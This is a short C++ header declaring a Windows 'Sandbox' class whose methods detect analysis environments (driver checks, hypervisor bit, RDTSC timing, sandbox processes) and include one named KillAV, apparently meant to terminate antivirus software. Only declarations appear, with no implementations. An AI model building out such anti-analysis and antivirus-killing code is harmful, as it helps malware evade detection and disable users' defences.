#pragma once

#include <windows.h>
#include <iostream>
#include <vector>
#include <intrin.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <tchar.h>

class Sandbox {
public:
	Sandbox();

	BOOL DetectSandbox();
	BOOL isDriversExists();
	BOOL IsHypervisorBitEnabled();
	BOOL IsRDTSCLatency();
	DWORD GetProcessIdByName(const std::string& processName);
	BOOL IsSandboxProcess();
	VOID KillAV();
};
